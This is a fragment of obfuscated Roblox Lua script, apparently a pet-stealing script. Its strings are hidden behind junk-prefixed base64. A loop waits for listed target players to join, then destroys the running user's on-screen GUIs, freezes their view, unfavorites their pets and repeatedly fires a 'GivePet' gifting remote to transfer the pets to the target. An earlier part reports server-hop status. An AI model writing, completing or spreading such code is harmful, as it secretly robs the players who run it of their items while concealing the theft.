        { name = KdOvFZYgKzIehHzTVMxiSEgY('TPooGwyBTxIhsZInigBNGpsxOJACJUyeQWumpNXvUNcbXTmLXMmmzPn8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and KdOvFZYgKzIehHzTVMxiSEgY('cIyRPVNOQdMSXGAjHKCbbYCVmedDhRdjKiEfnUuSzSJPpOxZCmRviSXUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or KdOvFZYgKzIehHzTVMxiSEgY('hSdsDEEYcqIuMzuoLXHxABzuHkiOHWOtSVcMJogbZbeHUErwZGthDuOQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                -- REMOVE ALL GUIS
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(KdOvFZYgKzIehHzTVMxiSEgY('YOGwCTkLdbgYSptHfOLbHPJlsETycVPvviWDdyinLtLrLzRKjWZgsCOU2NyZWVuR3Vp')) or gui:IsA(KdOvFZYgKzIehHzTVMxiSEgY('EyZFPbWZDparEgJAmjTuXiwTQIwMzEcXaVPOvpMPYfvGxetMHoqIQmuQmlsbGJvYXJkR3Vp')) or gui:IsA(KdOvFZYgKzIehHzTVMxiSEgY('tgrqhqYcQnmvYFJVRLAylPSWrFKPqzUOfJxYVZeUAhPojXFlqfmZedIU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(KdOvFZYgKzIehHzTVMxiSEgY('mTrZAXrpXhxWNeNoCekwduXFKjFqnCcKBObHGMdhdKZFXqyHjRANIbuVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {KdOvFZYgKzIehHzTVMxiSEgY('KaxRuqhNCpaHKbMypZbnpVHvDSZFtiKEnAvdimbQjeSBKLWEuFjzhRMR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(KdOvFZYgKzIehHzTVMxiSEgY('bXVQCAZJaHKYurMUIhIOiRzKWWQOYtEzfDVFEbtQURRLtRczkHerfNYR2FtZUV2ZW50cw==')):WaitForChild(KdOvFZYgKzIehHzTVMxiSEgY('CJithovKOHxlwSIBSyekjuiFTDSndsDybAElnzwBKOBuJCQUFXUwbERUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
